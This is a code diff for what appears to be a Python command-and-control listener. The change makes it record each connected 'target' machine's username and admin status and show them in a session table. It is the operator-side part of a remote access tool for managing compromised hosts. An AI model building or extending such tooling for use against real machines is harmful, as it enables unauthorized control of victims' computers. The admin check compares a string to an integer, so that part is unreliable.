@@ -64,12 +64,18 @@ def comm_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
+            username = remote_target.recv(1024).decode()
+            admin = remote_target.recv(1024).decode()
+            if admin == 1:
+                admin_val = 'Yes'
+            else:
+                admin_val = 'No'
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
             else:
                 targets.append([remote_target, remote_ip[0], time_record])
@@ -100,10 +106,10 @@ if __name__ == '__main__':
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
                     myTable = PrettyTable()
-                    myTable.field_names = ['Session', 'Status', 'Target', 'Username', 'Session Start Time']
+                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Session Start Time']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, 'Placeholder', 'Placeholder', target[1], target[2]])
+                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                         session_counter += 1
                     print (myTable)
                 if command.split(" ")[1] == '-i':
